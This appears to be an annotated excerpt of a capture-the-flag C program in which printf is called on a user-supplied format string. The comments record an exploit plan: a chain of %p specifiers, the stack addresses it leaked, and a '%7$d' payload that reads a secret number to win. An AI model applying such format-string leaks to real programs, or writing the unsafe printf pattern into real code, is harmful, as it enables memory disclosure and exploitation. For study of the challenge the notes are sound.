...
mat3:
        ...
        switch (number)
        {
            case 1:
		        ...
		        set += 1; // Guess once set++, guess 4 times, fav_num wont change if wrong instruction.
                          // Guess 4 times wrongly -> leak through case 2 -> guess again using leak
mat4:
                guess_me(fav_num);
                break;
...
mat5:
		...
		printf(format);
                ...
                // fav_num in "main" stack frame
                // fav_num=0xffffd33c   
                // %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
                // 0x804c100 0x40 0x80493c0 0x804c000 0xf7fb2000 0x804c000 0xb3be5 0xffffd360 (nil) (nil) 0xf7de1ee5 0xf7fb2000 0xf7fb2000 (nil) 0xf7de1ee5 0x1 0xffffd3f4 0xffffd3fc 0xffffd384 0xf7fb2000 (nil)
                // %7$d win
